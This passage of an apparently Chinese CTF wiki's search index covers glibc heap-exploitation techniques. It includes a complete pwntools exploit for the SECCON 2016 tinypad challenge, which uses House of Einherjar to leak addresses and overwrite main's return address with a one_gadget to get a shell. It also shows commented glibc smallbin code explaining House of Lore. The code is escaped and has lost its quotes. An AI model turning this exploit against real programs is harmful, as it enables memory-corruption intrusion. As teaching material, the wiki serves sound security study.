 ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );        \u6240\u4ee5\u53ea\u9700\u8981\u518d\u4f2a\u9020 fake chunk \u7684 next chunk \u7684 prev_size \u5b57\u6bb5\u5c31\u597d\u4e86\u3002", 
            "title": "\u653b\u51fb\u8fc7\u7a0b\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_10", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u603b\u7ed3\u4e0b\u8fd9\u4e2a\u5229\u7528\u6280\u672f\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9   \u9700\u8981\u6709\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u5199\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\u7684 prev_size \u4e0e PREV_INUSE \u90e8\u5206\u3002  \u6211\u4eec\u9700\u8981\u8ba1\u7b97\u76ee\u7684 chunk \u4e0e p1 \u5730\u5740\u4e4b\u95f4\u7684\u5dee\uff0c\u6240\u4ee5\u9700\u8981\u6cc4\u6f0f\u5730\u5740\u3002  \u6211\u4eec\u9700\u8981\u5728\u76ee\u7684 chunk \u9644\u8fd1\u6784\u9020\u76f8\u5e94\u7684 fake chunk\uff0c\u4ece\u800c\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002   \u5176\u5b9e\uff0c\u8be5\u6280\u672f\u4e0e chunk extend/shrink \u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\u3002", 
            "title": "\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#2016-seccon-tinypad", 
            "text": "", 
            "title": "2016 Seccon tinypad"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_11", 
            "text": "\u9996\u5148\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ee5\u6765\u4e00\u4e2a\u6838\u5fc3\u7684\u8bfb\u53d6\u51fd\u6570\uff0c\u5373\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u800c\uff0c\u5f53\u8bfb\u53d6\u7684\u957f\u5ea6\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u957f\u5ea6\u65f6\uff0c\u4f1a\u51fa\u73b0  off by one \u7684\u6f0f\u6d1e \u3002  \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\u64cd\u4f5c\u4e00\u4e2a tinypad\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u64cd\u4f5c   \u5f00\u5934\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u5f00\u5934\u4f9d\u6b21\u5224\u65ad\u6bcf\u4e2a memo \u7684\u6307\u9488\u6765\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8fdb\u800c\u5229\u7528 strlen \u6c42\u5f97\u5176\u76f8\u5e94\u7684\u957f\u5ea6\uff0c\u5c06 memo \u7684\u5185\u5bb9\u8f93\u51fa\u3002\u4ece\u8fd9\u91cc\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u6700\u591a\u6709 4 \u4e2a memo\u3002  \u6dfb\u52a0 memo\uff0c\u904d\u5386\u5b58\u50a8 memo \u7684\u53d8\u91cftinypad\uff0c\u6839\u636e tinypad \u7684\u5b58\u50a8\u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u4f7f\u7528\uff0c\u7136\u540e\u8fd8\u6709\u7684\u8bdd\uff0c\u5206\u914d\u4e00\u4e2a memo\u3002\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u7a0b\u5e8f\u53ea\u662f\u4ece tinypad \u8d77\u59cb\u504f\u79fb16*16=256 \u5904\u624d\u5f00\u59cb\u4f7f\u7528\uff0c\u6bcf\u4e2a memo \u5b58\u50a8\u4e24\u4e2a\u5b57\u6bb5\uff0c\u4e00\u4e2a\u662f\u8be5 memo \u7684\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a\u662f\u8be5 memo \u5bf9\u5e94\u7684\u6307\u9488\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ed3\u6784\u4f53\uff0c\u5e76\u4fee\u6539 ida \u8bc6\u522b\u7684 tinypad\uff0c\u4f7f\u4e4b\u66f4\u52a0\u53ef\u8bfb\uff08\u4f46\u662f\u5176\u5b9e ida \u6ca1\u6709\u529e\u6cd5\u5e2e\u5fd9\u667a\u80fd\u8bc6\u522b\u3002\uff09\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u8be5\u6dfb\u52a0\u529f\u80fd\u4f9d\u8d56\u4e8e\u8bfb\u53d6\u51fd\u6570\uff0c\u6240\u4ee5\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7528\u6237\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u6700\u5927\u4e3a 256 \u5b57\u8282\uff0c\u548c tinypad \u524d\u9762\u7684\u672a\u4f7f\u7528\u7684 256 \u5b57\u8282\u6070\u597d\u4e00\u81f4\u3002  \u5220\u9664\uff0c\u6839\u636e\u5b58\u50a8 memo \u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u88ab\u4f7f\u7528\uff0c\u540c\u65f6\u5c06\u76f8\u5e94 memo \u5927\u5c0f\u8bbe\u7f6e\u4e3a0\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u8bbe\u7f6e\u4e3a NULL\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4 Use After Free\u3002 \u5373\u5728\u7a0b\u5e8f\u5f00\u5934\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u8f93\u51fa\u4e00\u4e9b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u6cc4\u6f0f\u4e00\u4e9b\u57fa\u5730\u5740\u7684\u57fa\u7840 \u3002  \u7f16\u8f91\u3002\u5728\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u6839\u636e\u4e4b\u524d\u5b58\u50a8\u7684 memo \u7684\u5185\u5bb9\u5c06\u5176\u62f7\u8d1d\u5230 tinypad \u7684\u524d 256 \u4e2a\u5b57\u8282\u4e2d\uff0c\u4f46\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u5f53 memo \u5b58\u50a8\u4e86 256 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u4f1a\u5b58\u5728 off by one\u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7a0b\u5e8f\u5229\u7528 strlen \u5224\u65ad\u590d\u5236\u4e4b\u540e\u7684 tinypad \u7684\u5185\u5bb9\u957f\u5ea6\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\u4e4b\u540e\u7a0b\u5e8f\u7ee7\u7eed\u5229\u7528 strlen \u6c42\u5f97 memo \u7684\u957f\u5ea6\uff0c\u5e76\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u5230 tinypad \u4e2d\uff0c\u6839\u636e\u8bfb\u53d6\u51fd\u6570\uff0c\u8fd9\u91cc\u5fc5\u7136\u51fa\u73b0\u4e86  \\x00 \u3002\u6700\u540e\u7a0b\u5e8f\u5c06\u8bfb\u53d6\u5230 tinypad \u524d 256 \u5b57\u8282\u7684\u5185\u5bb9\u653e\u5230\u5bf9\u5e94 memo \u4e2d\u3002  \u9000\u51fa", 
            "title": "\u57fa\u672c\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_12", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528\u5220\u9664\u65f6\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u4e3aNULL\u7684 UAF \u6f0f\u6d1e\uff0c\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740  \u518d\u6b21\u5229\u7528 UAF \u6f0f\u6d1e\u6cc4\u6f0f libc \u7684\u57fa\u5730\u5740\u3002  \u5229\u7528 house of einherjar \u65b9\u6cd5\u5728 tinypad \u7684\u524d 256 \u5b57\u8282\u4e2d\u4f2a\u9020 chunk\u3002\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u65f6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u63a7\u52364\u4e2a memo \u7684\u6307\u9488\u548c\u5185\u5bb9\u4e86\u3002  \u8fd9\u91cc\u867d\u7136\u6211\u4eec\u7684\u7b2c\u4e00\u60f3\u6cd5\u53ef\u80fd\u662f\u76f4\u63a5\u8986\u76d6 malloc_hook \u4e3a one_gadget \u5730\u5740\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u5f53\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u662f\u5229\u7528 strlen \u6765\u5224\u8bfb\u53ef\u4ee5\u8bfb\u53d6\u591a\u5c11\u957f\u5ea6\uff0c\u800c malloc_hook \u5219\u5728\u521d\u59cb\u65f6\u4e3a 0\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8986\u76d6\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u5373\u4fee\u6539\u7a0b\u5e8f\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget\uff0c\u4e4b\u6240\u4ee5\u53ef\u4ee5\u884c\u5f97\u901a\uff0c\u662f\u56e0\u4e3a\u8fd4\u56de\u5730\u5740\u5f80\u5f80\u662f 7f \u5f00\u5934\u7684\uff0c\u957f\u5ea6\u8db3\u591f\u957f\uff0c\u53ef\u4ee5\u8986\u76d6\u4e3aone_gadget\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u9700\u8981\u6cc4\u6f0f main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u7531\u4e8e libc \u4e2d\u5b58\u50a8\u4e86 main \u51fd\u6570 environ \u6307\u9488\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5148\u6cc4\u9732\u51faenviron \u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u5f97\u77e5\u5b58\u50a8 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\u8fd9\u91cc\u9009\u53d6 environ \u7b26\u53f7\u662f\u56e0\u4e3a environ \u7b26\u53f7\u5728 libc \u4e2d\u4f1a\u5bfc\u51fa\uff0c\u800c\u50cf argc \u548c argv \u5219\u4e0d\u4f1a\u5bfc\u51fa\uff0c\u76f8\u5bf9\u6765\u8bf4\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u4e00\u70b9\u3002  \u6700\u540e\u4fee\u6539 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u5730\u5740\u83b7\u53d6shell\u3002   \u5177\u4f53\u5229\u7528\u811a\u672c\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  tinypad   =   ELF ( ./tinypad )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 ) \n     libc   =   ELF ( ./libc.so.6 )  else : \n     p   =   process ( ./tinypad ) \n     libc   =   ELF ( ./libc.so.6 ) \n     main_arena_offset   =   0x3c4b20  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  def   add ( size ,   content ): \n     p . recvuntil ( (CMD)   ) \n     p . sendline ( a ) \n     p . recvuntil ( (SIZE)   ) \n     p . sendline ( str ( size )) \n     p . recvuntil ( (CONTENT)   ) \n     p . sendline ( content )  def   edit ( idx ,   content ): \n     p . recvuntil ( (CMD)   ) \n     p . sendline ( e ) \n     p . recvuntil ( (INDEX)   ) \n     p . sendline ( str ( idx )) \n     p . recvuntil ( (CONTENT)   ) \n     p . sendline ( content ) \n     p . recvuntil ( Is it OK? \\n ) \n     p . sendline ( Y )  def   delete ( idx ): \n     p . recvuntil ( (CMD)   ) \n     p . sendline ( d ) \n     p . recvuntil ( (INDEX)   ) \n     p . sendline ( str ( idx ))  def   run (): \n     p . recvuntil ( \n           ============================================================================ \\n\\n \n     ) \n     # 1. leak heap base \n     add ( 0x70 ,   a   *   8 )    # idx 0 \n     add ( 0x70 ,   b   *   8 )    # idx 1 \n     add ( 0x100 ,   c   *   8 )    # idx 2 \n\n     delete ( 2 )    # delete idx 1 \n     delete ( 1 )    # delete idx 0, idx 0 point to idx 1 \n     p . recvuntil (  # CONTENT:  ) \n     data   =   p . recvuntil ( \\n ,   drop = True )    # get pointer point to idx1 \n     heap_base   =   u64 ( data . ljust ( 8 ,   \\x00 ))   -   0x80 \n     log . success ( get heap base:    +   hex ( heap_base )) \n\n     # 2. leak libc base \n     # this will trigger malloc_consolidate \n     # first idx0 will go to unsorted bin \n     # second idx1 will merge with idx0(unlink), and point to idx0 \n     # third idx1 will merge into top chunk \n     # but cause unlink feture, the idx0 s fd and bk won t change \n     # so idx0 will leak the unsorted bin addr \n     delete ( 3 ) \n     p . recvuntil (  # CONTENT:  ) \n     data   =   p . recvuntil ( \\n ,   drop = True ) \n     unsorted_offset_arena   =   8   +   10   *   8 \n     main_arena   =   u64 ( data . ljust ( 8 ,   \\x00 ))   -   unsorted_offset_arena \n     libc_base   =   main_arena   -   main_arena_offset \n     log . success ( main arena addr:    +   hex ( main_arena )) \n     log . success ( libc base addr:    +   hex ( libc_base )) \n\n     # 3. house of einherjar \n     add ( 0x18 ,   a   *   0x18 )    # idx 0 \n     # we would like trigger house of einherjar at idx 1 \n     add ( 0x100 ,   b   *   0xf8   +   \\x11 )    # idx 1 \n     add ( 0x100 ,   c   *   0xf8 )    # idx 2 \n     add ( 0x100 ,   d   *   0xf8 )    #idx 3 \n\n     # create a fake chunk in tinypad s 0x100 buffer, offset 0x20 \n     tinypad_addr   =   0x602040 \n     fakechunk_addr   =   tinypad_addr   +   0x20 \n     fakechunk_size   =   0x101 \n     fakechunk   =   p64 ( 0 )   +   p64 ( fakechunk_size )   +   p64 ( fakechunk_addr )   +   p64 ( \n         fakechunk_addr ) \n     edit ( 3 ,   d   *   0x20   +   fakechunk ) \n\n     # overwrite idx 1 s prev_size and \n     # set minaddr of size to  \\x00 \n     # idx 0 s chunk size is 0x20 \n     diff   =   heap_base   +   0x20   -   fakechunk_addr \n     log . info ( diff between idx1 and fakechunk:    +   hex ( diff )) \n     #  \\0  padding caused by strcpy \n     diff_strip   =   p64 ( diff ) . strip ( \\0 ) \n     number_of_zeros   =   len ( p64 ( diff ))   -   len ( diff_strip ) \n     for   i   in   range ( number_of_zeros   +   1 ): \n         data   =   diff_strip . rjust ( 0x18   -   i ,   f ) \n         edit ( 1 ,   data ) \n     delete ( 2 ) \n     p . recvuntil ( \\n Deleted. ) \n\n     # fix the fake chunk size, fd and bk \n     # fd and bk must be unsorted bin \n     edit ( 4 ,   d   *   0x20   +   p64 ( 0 )   +   p64 ( 0x101 )   +   p64 ( main_arena   +   88 )   + \n          p64 ( main_arena   +   88 )) \n\n     # 3. overwrite malloc_hook with one_gadget \n\n     one_gadget_addr   =   libc_base   +   0x45216 \n     environ_pointer   =   libc_base   +   libc . symbols [ __environ ] \n     log . info ( one gadget addr:    +   hex ( one_gadget_addr )) \n     log . info ( environ pointer addr:    +   hex ( environ_pointer )) \n     #fake_malloc_chunk = main_arena - 60 + 9 \n     # set memo[0].size =  a *8, \n     # set memo[0].content point to environ to leak environ addr \n     fake_pad   =   f   *   ( 0x100   -   0x20   -   0x10 )   +   a   *   8   +   p64 ( \n         environ_pointer )   +   a   *   8   +   p64 ( 0x602148 ) \n     # get a fake chunk \n     add ( 0x100   -   8 ,   fake_pad )    # idx 2 \n     #gdb.attach(p) \n\n     # get environ addr \n     p . recvuntil (  # CONTENT:  ) \n     environ_addr   =   p . recvuntil ( \\n ,   drop = True ) . ljust ( 8 ,   \\x00 ) \n     environ_addr   =   u64 ( environ_addr ) \n     main_ret_addr   =   environ_addr   -   30   *   8 \n\n     # set memo[0].content point to main_ret_addr \n     edit ( 2 ,   p64 ( main_ret_addr )) \n     # overwrite main_ret_addr with one_gadget addr \n     edit ( 1 ,   p64 ( one_gadget_addr )) \n     p . interactive ()  if   __name__   ==   __main__ : \n     run ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_13", 
            "text": "https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606  https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/", 
            "text": "House of Lore\n\n\n\u6982\u8ff0\n\n\nHouse of Lore \u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Small Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002\n\n\nHouse of Lore \u53ef\u4ee5\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u4f4d\u7f6e\u7684 chunk\uff0c\u4ece\u800c\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002\n\n\nHouse of Lore \u5229\u7528\u7684\u524d\u63d0\u662f\u9700\u8981\u63a7\u5236 Small Bin Chunk \u7684 bk \u6307\u9488\uff0c\u5e76\u4e14\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e chunk \u7684 fd \u6307\u9488\u3002\n\n\n\u57fa\u672c\u539f\u7406\n\n\n\u5982\u679c\u5728 malloc \u7684\u65f6\u5019\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5728 small bin \u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b\n\n\n    \n/*\n\n\n       If a small request, check regular bin.  Since these \nsmallbins\n\n\n       hold one size each, no searching within bins is necessary.\n\n\n       (For a large request, we need to wait until unsorted chunks are\n\n\n       processed to find best fit. But for small ones, fits are exact\n\n\n       anyway, so we can check now, which is faster.)\n\n\n     */\n\n\n    \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n \n{\n\n        \n// \u83b7\u53d6 small bin \u7684\u7d22\u5f15\n\n        \nidx\n \n=\n \nsmallbin_index\n(\nnb\n);\n\n        \n// \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488\n\n        \nbin\n \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n        \n// \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk\n\n        \n// \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002\n\n        \n// \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5\n\n        \nif\n \n((\nvictim\n \n=\n \nlast\n(\nbin\n))\n \n!=\n \nbin\n)\n \n{\n\n            \n// \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002\n\n            \nif\n \n(\nvictim\n \n==\n \n0\n)\n \n/* initialization check */\n\n                \n// \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\n\n                \nmalloc_consolidate\n(\nav\n);\n\n            \n// \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk\n\n            \nelse\n \n{\n\n                \n// \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002\n\n                \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n                \n// \u68c0\u67e5 bck-\nfd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020\n\n                \nif\n \n(\n__glibc_unlikely\n(\nbck\n-\nfd\n \n!=\n \nvictim\n))\n \n{\n\n                    \nerrstr\n \n=\n \nmalloc(): smallbin double linked list corrupted\n;\n\n                    \ngoto\n \nerrout\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765\n\n                \nbin\n-\nbk\n \n=\n \nbck\n;\n\n                \nbck\n-\nfd\n \n=\n \nbin\n;\n\n                \n// \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7\n\n                \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n// \u7ec6\u81f4\u7684\u68c0\u67e5\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n        \n}\n\n    \n}\n\n\n\n\n\n\u4ece\u4e0b\u9762\u7684\u8fd9\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\n\n\n                \n// \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002\n\n                \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n                \n// \u68c0\u67e5 bck-\nfd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020\n\n                \nif\n \n(\n__glibc_unlikely\n(\nbck\n-\nfd\n \n!=\n \nvictim\n))\n \n{\n\n                    \nerrstr\n \n=\n \nmalloc(): smallbin double linked list corrupted\n;\n\n                    \ngoto\n \nerrout\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765\n\n                \nbin\n-\nbk\n \n=\n \nbck\n;\n\n                \nbck\n-\nfd\n \n=\n \nbin\n;\n\n\n\n\n\n\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck-\nfd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002\n\n\n\u4f8b\u5b50\n\n\n\u5f85\u8865\u5145\u3002", 
            "title": "House of Lore"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#house-of-lore", 
            "text": "", 
            "title": "House of Lore"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#_1", 
            "text": "House of Lore \u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Small Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002  House of Lore \u53ef\u4ee5\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u4f4d\u7f6e\u7684 chunk\uff0c\u4ece\u800c\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002  House of Lore \u5229\u7528\u7684\u524d\u63d0\u662f\u9700\u8981\u63a7\u5236 Small Bin Chunk \u7684 bk \u6307\u9488\uff0c\u5e76\u4e14\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e chunk \u7684 fd \u6307\u9488\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/#_2", 
            "text": "\u5982\u679c\u5728 malloc \u7684\u65f6\u5019\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5728 small bin \u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b       /*         If a small request, check regular bin.  Since these  smallbins         hold one size each, no searching within bins is necessary.         (For a large request, we need to wait until unsorted chunks are         processed to find best fit. But for small ones, fits are exact         anyway, so we can check now, which is faster.)       */ \n\n     if   ( in_smallbin_range ( nb ))   { \n         // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 \n         idx   =   smallbin_index ( nb ); \n         // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 \n         bin   =   bin_at ( av ,   idx ); \n         // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \n         // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 \n         // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 \n         if   (( victim   =   last ( bin ))   !=   bin )   { \n             // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 \n             if   ( victim   ==   0 )   /* initialization check */ \n                 // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 \n                 malloc_consolidate ( av ); \n             // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk \n             else   { \n                 // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 \n                 bck   =   victim - bk ; \n                 // \u68c0\u67e5 bck- fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 \n                 if   ( __glibc_unlikely ( bck - fd   !=   victim ))   { \n                     errstr   =   malloc(): smallbin double linked list corrupted ; \n                     goto   errout ; \n                 } \n                 // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d \n                 set_inuse_bit_at_offset ( victim ,   nb ); \n                 // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 \n                 bin - bk   =   bck ; \n                 bck - fd   =   bin ; \n                 // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 \n                 if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 // \u7ec6\u81f4\u7684\u68c0\u67e5 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             } \n         } \n     }   \u4ece\u4e0b\u9762\u7684\u8fd9\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u770b\u51fa                   // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 \n                 bck   =   victim - bk ; \n                 // \u68c0\u67e5 bck- fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 \n                 if   ( __glibc_unlikely ( bck - fd   !=   victim ))   { \n                     errstr   =   malloc(): smallbin double linked list corrupted ; \n                     goto   errout ; \n                 } \n                 // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d \n                 set_inuse_bit_at_offset ( victim ,   nb ); \n                 // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin 